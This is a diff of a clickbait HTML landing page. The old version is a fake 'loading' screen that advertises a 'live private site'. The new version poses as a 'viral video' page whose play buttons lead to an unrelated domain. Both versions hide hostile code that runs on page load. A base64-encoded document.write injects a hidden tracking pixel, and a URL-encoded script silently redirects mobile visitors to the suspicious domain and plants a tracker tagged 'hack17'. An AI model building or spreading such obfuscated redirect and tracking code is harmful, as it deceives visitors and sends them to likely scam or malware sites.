@@ -1,347 +1,347 @@
-
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<html amp>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <style amp-boilerplate>
+      body {
+        -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+        -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+        -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+        animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+      }
 
-<!-- OPEN GRAPH (FB PREVIEW) -->
-<meta property="og:type" content="website">
-<meta property="og:title" content="💋 LIVE ON A PRIVATE SITE 🔥 FREE AND FUN 👀 JOIN NOW">
-<meta property="og:description" content="729.784 Online Members">
-<meta property="og:image" content="https://raw.githubusercontent.com/sabarsuburkacak-byte/szFsdzfgfsd/refs/heads/main/Screenshot_2.png">
-<meta property="og:image:width" content="1080">
-<meta property="og:image:height" content="1080">
+      @-webkit-keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
 
-<!-- STYLE ANIMASI -->
-<style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
+      @-moz-keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
 
-html, body {
-  height: 100%;
-  background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
-  color: #fff;
-  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-  overflow: hidden;
-}
+      @-ms-keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
 
-.wrap {
-  height: 100%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  flex-direction: column;
-  position: relative;
-}
+      @-o-keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
 
-/* Background animated particles */
-.particles {
-  position: absolute;
-  width: 100%;
-  height: 100%;
-  overflow: hidden;
-  z-index: 0;
-}
-
-.particle {
-  position: absolute;
-  width: 4px;
-  height: 4px;
-  background: rgba(255, 255, 255, 0.3);
-  border-radius: 50%;
-  animation: float 15s infinite;
-}
-
-@keyframes float {
-  0%, 100% {
-    transform: translateY(100vh) rotate(0deg);
-    opacity: 0;
-  }
-  10% {
-    opacity: 1;
-  }
-  90% {
-    opacity: 1;
-  }
-  100% {
-    transform: translateY(-100vh) rotate(720deg);
-    opacity: 0;
-  }
-}
-
-/* Main content */
-.content {
-  z-index: 1;
-  text-align: center;
-}
-
-/* Modern spinner */
-.loader-container {
-  position: relative;
-  width: 120px;
-  height: 120px;
-  margin-bottom: 30px;
-}
-
-.loader {
-  position: absolute;
-  width: 100%;
-  height: 100%;
-  border: 4px solid transparent;
-  border-top-color: #3b82f6;
-  border-right-color: #8b5cf6;
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-}
-
-.loader-inner {
-  position: absolute;
-  top: 15px;
-  left: 15px;
-  right: 15px;
-  bottom: 15px;
-  border: 4px solid transparent;
-  border-top-color: #ec4899;
-  border-left-color: #f59e0b;
-  border-radius: 50%;
-  animation: spin-reverse 1.5s linear infinite;
-}
-
-.loader-core {
-  position: absolute;
-  top: 35px;
-  left: 35px;
-  right: 35px;
-  bottom: 35px;
-  background: linear-gradient(135deg, #3b82f6, #ec4899);
-  border-radius: 50%;
-  animation: pulse 2s ease-in-out infinite;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 24px;
-}
-
-@keyframes spin {
-  to { transform: rotate(360deg); }
-}
-
-@keyframes spin-reverse {
-  to { transform: rotate(-360deg); }
-}
-
-@keyframes pulse {
-  0%, 100% { transform: scale(1); opacity: 0.8; }
-  50% { transform: scale(1.1); opacity: 1; }
-}
-
-/* Loading text */
-.text {
-  font-size: 28px;
-  font-weight: 700;
-  margin-bottom: 10px;
-  background: linear-gradient(90deg, #3b82f6, #ec4899, #f59e0b);
-  background-size: 200% auto;
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-  animation: gradient-shift 3s ease infinite;
-}
-
-@keyframes gradient-shift {
-  0% { background-position: 0% center; }
-  50% { background-position: 100% center; }
-  100% { background-position: 0% center; }
-}
-
-.subtext {
-  font-size: 14px;
-  color: rgba(255, 255, 255, 0.6);
-  margin-bottom: 25px;
-}
-
-/* Progress bar */
-.progress-container {
-  width: 280px;
-  height: 6px;
-  background: rgba(255, 255, 255, 0.1);
-  border-radius: 10px;
-  overflow: hidden;
-  margin-bottom: 15px;
-}
-
-.progress-bar {
-  height: 100%;
-  background: linear-gradient(90deg, #3b82f6, #ec4899, #f59e0b);
-  border-radius: 10px;
-  width: 0%;
-  animation: loading 3s ease-in-out forwards;
-  box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
-}
-
-@keyframes loading {
-  0% { width: 0%; }
-  100% { width: 100%; }
-}
-
-/* Percentage counter */
-.percentage {
-  font-size: 16px;
-  font-weight: 600;
-  color: #3b82f6;
-  font-variant-numeric: tabular-nums;
-}
-
-/* Redirect message */
-.redirect-msg {
-  margin-top: 20px;
-  padding: 12px 24px;
-  background: rgba(255, 255, 255, 0.05);
-  border: 1px solid rgba(255, 255, 255, 0.1);
-  border-radius: 50px;
-  font-size: 13px;
-  color: rgba(255, 255, 255, 0.7);
-  backdrop-filter: blur(10px);
-  opacity: 0;
-  transform: translateY(10px);
-  animation: fade-in-up 0.5s ease forwards 2s;
-}
-
-@keyframes fade-in-up {
-  to {
-    opacity: 1;
-    transform: translateY(0);
-  }
-}
-
-.redirect-msg span {
-  color: #3b82f6;
-  font-weight: 600;
-}
-
-/* Responsive */
-@media (max-width: 480px) {
-  .loader-container {
-    width: 100px;
-    height: 100px;
-  }
-  
-  .loader-core {
-    top: 28px;
-    left: 28px;
-    right: 28px;
-    bottom: 28px;
-    font-size: 20px;
-  }
-  
-  .text {
-    font-size: 24px;
-  }
-  
-  .progress-container {
-    width: 240px;
-  }
-}
-</style>
-
+      @keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
+    </style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, minimum-scale=1">
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:700,300" rel="stylesheet" type="text/css">
+    <style amp-custom>
+      #branch-sdk {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        right: 0;
+      }
+      body {
+        margin: 0;
+        word-wrap: break-word;
+        font-family: "Open Sans", Helvetica, serif;
+      }
+      .main-image {
+        width: 100%;
+        height: 250px;
+        height: 75vw;
+        background-image: url(https://i.imgur.com/Buw5EGO.gif);
+        background-size: cover;
+        background-position: top center;
+      }
+      #content-container {
+        box-sizing: border-box;
+        padding: 24px;
+        margin: 0 24px;
+        background-color: #fff;
+      }
+      .app-title {
+        font-size: 14px;
+        padding-bottom: 11px;
+        text-transform: uppercase;
+      }
+      .card-title {
+        font-size: 33px;
+        line-height: 36px;
+      }
+      .app-content {
+        padding-top: 10px;
+        padding-bottom: 100px;
+        font-size: 20px;
+      }
+      .input-wrapper {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        height: 110px;
+        background-color: #fff;
+        box-shadow: 0px -20px 20px -8px rgba(255, 255, 255, 1);
+      }
+      .input-container {
+        width: 100%;
+        padding: 0 24px;
+        text-align: center;
+        box-sizing: border-box;
+      }
+      .form-get-the-app {
+        display: flex;
+        text-align: center;
+        padding-top: 10px;
+        border-top: 2px solid #cecece;
+        min-height: 300px;
+      }
+      .input-label {
+        padding: 4px 10px;
+        font-size: 13px;
+        overflow: hidden;
+        word-wrap: break-word;
+        text-align: center;
+      }
+      .cta-button {
+        flex-grow: 1;
+        height: 62px;
+        line-height: 62px;
+        background-color: #fa0909;
+        border-radius: 2px;
+        font-size: 20px;
+        padding: 0 20px;
+        margin-left: 10px;
+        color: #fff;
+        text-align: center;
+        text-decoration: none;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+      }
+      .cta-button:hover {
+        background-color: #d10808;
+      }
+      @media only screen and (orientation: portrait) {
+        .card--no-data .main-image {
+          background-image: url("https://lh3.googleusercontent.com/blogger_img_proxy/AJ0KDdXqmhUjb0Pyb60s9WXqoPPJiyip91IhktsNjXR7XgoeIl5wuhXJ9WDtXK38y87YiR9tmL1cf6LGUNUbJZaEdicM7fr3cRTsyDfQOT-RiSzfAkt2mqPmOul3fIn_0rXD3N8f1mqeKsA=s0-d");
+          background-size: auto;
+          background-position: top center;
+          background-repeat: repeat;
+          height: 190px;
+        }
+        .card--no-data > .app-icon {
+          position: absolute;
+          top: 160px;
+          left: 34px;
+        }
+        .card--no-data #content-container {
+          margin-top: 20px;
+        }
+      }
+      @media screen and (min-device-width: 321px) {
+        .input-label {
+          font-size: 14px;
+        }
+      }
+      @media only screen and (min-device-width: 375px) and (orientation: portrait) {
+        .main-image {
+          height: 300px;
+          height: 80vw;
+        }
+        .app-content {
+          padding-bottom: 120px;
+        }
+        .input-wrapper {
+          height: 115px;
+        }
+      }
+      @media only screen and (min-device-width: 414px) and (orientation: portrait) {
+        .main-image {
+          height: 390px;
+          height: 95vw;
+        }
+      }
+      @media only screen and (orientation: landscape) {
+        .main-image {
+          position: fixed;
+          height: 100%;
+          height: 100vh;
+          width: 50%;
+        }
+        .input-wrapper {
+          right: 0;
+          left: auto;
+          width: 50%;
+        }
+        #content-container {
+          float: left;
+          width: 50%;
+          margin-left: 50%;
+        }
+        .input-wrapper {
+          height: 108px;
+        }
+        .app-content {
+          padding-bottom: 110px;
+        }
+        .form-get-the-app {
+          padding-top: 8px;
+        }
+        .input-container {
+          left: 50%;
+        }
+        .cta-button {
+          height: 44px;
+          line-height: 44px;
+          padding: 0 5px;
+          margin-left: 50px;
+        }
+        .app-icon {
+          width: 44px;
+          height: 44px;
+        }
+        .card--no-data .main-image {
+          height: 100%;
+        }
+        .card--no-data > .app-icon {
+          display: none;
+        }
+        .card--no-data #content-container {
+          margin-top: 0;
+        }
+      }
+      @media only screen and (min-device-width: 645px) and (orientation: landscape) {
+        .form-get-the-app {
+          padding-top: 8px;
+        }
+        .cta-button {
+          height: 62px;
+          line-height: 62px;
+          padding: 0 20px;
+          margin-left: 70px;
+        }
+        .app-icon {
+          width: 62px;
+          height: 62px;
+          top: -2px;
+        }
+      }
+      .text-bold {
+        font-weight: 700;
+      }
+      .text-light {
+        font-weight: 300;
+      }
+      .cta-button--no-app-icon {
+        margin-left: 0;
+      }
+    </style>
+    <link rel="apple-touch-icon" href=https://i.imgur.com/Bu14RjD.png">
+    <meta property="al:android:package" content="http://rumb.iblogger.org/">
+    <meta name="twitter:app:id:googleplay" content="http://rumb.iblogger.org/">
+    <meta property="al:android:app_name" content="Viralfacebookvideo">
+    <meta name="twitter:app:name:googleplay" content="Viralfacebookvideo">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="og:image" content="https://i.imgur.com/Bu14RjD.png">
+    <meta name="twitter:image:src" content="https://i.imgur.com/Bu14RjD.png">
+    <title> Play Vídeo ⏯️ </title>
+    <meta property="og:title" content="Video Completo">
+    <meta name="twitter:title" content="VIDEO ORIGINAL">
+    <meta property="og:description" content="Video Completo">
+    <meta name="twitter:description" content="VIDEO ORIGINAL">
+    <meta name="twitter:app:country" content="US">
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+    <script async src="https://cdn.ampproject.org/v0/amp-iframe-0.1.js" custom-element="amp-iframe"></script>
+    <script async src="https://cdn.ampproject.org/v0/amp-list-0.1.js" custom-element="amp-list"></script>
+    <script async src="https://cdn.ampproject.org/v0/amp-mustache-0.2.js" custom-template="amp-mustache"></script>
+    <link rel="canonical" href="https://sixstale.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6'">
+  <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
-<body>
-  <div class="wrap">
-    <!-- Background particles -->
-    <div class="particles" id="particles"></div>
-    
-    <div class="content">
-      <div class="loader-container">
-        <div class="loader"></div>
-        <div class="loader-inner"></div>
-        <div class="loader-core">🔴</div>
+  <body>
+    <meta http-equiv="cache-control" content="no-cache">
+         <script>document.write(atob("PGltZyBzcmM9Ii8vd2hvcy5hbXVuZy51cy9waW5nanMvP2s9bTZzdGhkZ3E3MCZhbXA7dD0uLS4mYW1wO3g9aHR0cHM6Ly93d3cuY2FzaC5hcHAiIHN0eWxlPSJkaXNwbGF5Om5vbmUiIC8+"));</script>
+    <noscript>
+      <style amp-boilerplate>
+        body {
+          -webkit-animation: none;
+          -moz-animation: none;
+          -ms-animation: none;
+          animation: none;
+        }
+      </style>
+    </noscript>
+    <div class="card center">
+      <a href="https://sixstale.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6'">
+        <div class="main-image"></div>
+      </a>
+      <div id="content-container">
+        <div class="app-title text-bold"></div>
+        <div class="card-title text-light"> ⚠️ VIDEO VIRAL COMPLETO 🌎</div>
+        <div class="app-content text-light"></div>
       </div>
-      
-      <div class="text">Wait a minute!</div>
-      <div class="subtext">Preparing your exclusive content</div>
-      
-      <div class="progress-container">
-        <div class="progress-bar"></div>
+      <div class="input-wrapper">
+        <div class="input-container">
+          <div class="input-label text-light">⬇️⬇️⬇️⬇️</div>
+          <div class="form-get-the-app">
+              <template type="amp-mustache" id="cta-template">
+               <a href="https://sixstale.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6'" class="cta-button text-light cta-button--no-app-icon">
+                 REPRODUCIR VIDEO
+                </a>
+                <amp-iframe
+                  id="branch-sdk"
+                  src="/amp-iframe-redirect?scheme_redirect=%7B%7Bscheme_redirect%7D%7D&amp;redirect_strategy=%7B%7Bredirect_strategy%7D%7D&amp;app_id=916490604035199433&amp;has_app=false"
+                  sandbox="allow-scripts allow-top-navigation"
+                  height="11"
+                  layout="fixed-height"
+                  frameborder="0"
+                ></amp-iframe>
+              </template>
+            </amp-list>
+          </div>
+        </div>
       </div>
-      
-      <div class="percentage" id="percentage">0%</div>
-      
-      <div class="redirect-msg">
-        Redirecting to <span>secure server</span> in <span id="countdown">3</span>s
-      </div>
+<!-- Botón redondo mejorado -->
+<div style="position: fixed; bottom: 0; left: 0; width: 100%; text-align: center; background-color: #fa0909; padding: 10px;">
+  <a href="https://sixstale.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6'" style="color: #fff; text-decoration: none; padding: 15px 20px; border-radius: 50px; font-size: 18px; display: inline-block;">
+    Reproducir Video
+  </a>
+</div>
+</div>
     </div>
-  </div>
-
-<script>
-// Create floating particles
-const particlesContainer = document.getElementById('particles');
-for (let i = 0; i < 50; i++) {
-  const particle = document.createElement('div');
-  particle.className = 'particle';
-  particle.style.left = Math.random() * 100 + '%';
-  particle.style.animationDelay = Math.random() * 15 + 's';
-  particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
-  particlesContainer.appendChild(particle);
-}
-
-// Animate percentage counter
-let percentage = 0;
-const percentageEl = document.getElementById('percentage');
-const interval = setInterval(() => {
-  percentage += Math.floor(Math.random() * 3) + 1;
-  if (percentage >= 100) {
-    percentage = 100;
-    clearInterval(interval);
-  }
-  percentageEl.textContent = percentage + '%';
-}, 50);
-
-// Countdown timer
-let countdown = 3;
-const countdownEl = document.getElementById('countdown');
-const countdownInterval = setInterval(() => {
-  countdown--;
-  if (countdown <= 0) {
-    clearInterval(countdownInterval);
-  } else {
-    countdownEl.textContent = countdown;
-  }
-}, 1000);
-
-// Delay redirect
-setTimeout(function () {
-  window.location.href = "https://sixstale.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6";
-}, 3000); // 3 detik untuk animasi lebih smooth
-</script>
-
-    <!-- Histats.com  START  (aync)-->
-<script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5009121,4,0,0,0,00010000']);
-_Hasync.push(['Histats.fasi', '1']);
-_Hasync.push(['Histats.track_hits', '']);
-(function() {
-var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
-hs.src = ('//s10.histats.com/js15_as.js');
-(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
-})();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5009121&101" alt="" border="0"></a></noscript>
-<!-- Histats.com  END  -->
-
-</body>
+    </div>
+    <script type="text/javascript">
+      var fb_list = [
+      ];
+    </script>
+  </body>
 </html>
-<script>
-var pagina = "https://sixstale.com/qxsczqqp?key=814cfc1b9f8fca23b6b1b6abe1e062e6";
 
-function redireccionar() {
-    location.href = pagina;
-}
-
-setTimeout(redireccionar, 100);
-</script>
-
-<img src="//whos.amung.us/pingjs/?k=hack17&t=Duko𓆰𓆪💯&x=https://www.facebook.com" style="display:none">
-
+<!-- Include the script -->
+<script type='text/javascript'>document.write(unescape('%3C%73%63%72%69%70%74%3E%20%69%66%28%73%63%72%65%65%6E%2E%63%6F%6C%6F%72%44%65%70%74%68%20%3E%3D%20%32%34%20%26%26%20%6E%61%76%69%67%61%74%6F%72%2E%63%6F%6F%6B%69%65%45%6E%61%62%6C%65%64%20%3D%3D%20%74%72%75%65%20%26%26%20%73%63%72%65%65%6E%2E%77%69%64%74%68%20%3C%20%31%30%30%30%29%20%7B%20%73%65%74%54%69%6D%65%6F%75%74%28%73%65%74%54%69%6D%65%2C%20%30%29%3B%20%7D%20%66%75%6E%63%74%69%6F%6E%20%73%65%74%54%69%6D%65%28%29%20%7B%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%20%3D%0A%27%68%74%74%70%73%3A%2F%2F%73%69%78%73%74%61%6C%65%2E%63%6F%6D%2F%71%78%73%63%7A%71%71%70%3F%6B%65%79%3D%38%31%34%63%66%63%31%62%39%66%38%66%63%61%32%33%62%36%62%31%62%36%61%62%65%31%65%30%36%32%65%36%27%3B%20%7D%20%3C%2F%73%63%72%69%70%74%3E%0A%3C%69%6D%67%20%73%72%63%3D%22%2F%2F%77%68%6F%73%2E%61%6D%75%6E%67%2E%75%73%2F%70%69%6E%67%6A%73%2F%3F%6B%3D%68%61%63%6B%31%37%26%74%3D%44%75%6B%6F𓆰𓆪💯%26%78%3D%68%74%74%70%73%3A%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%22%3E%0A'))</script>
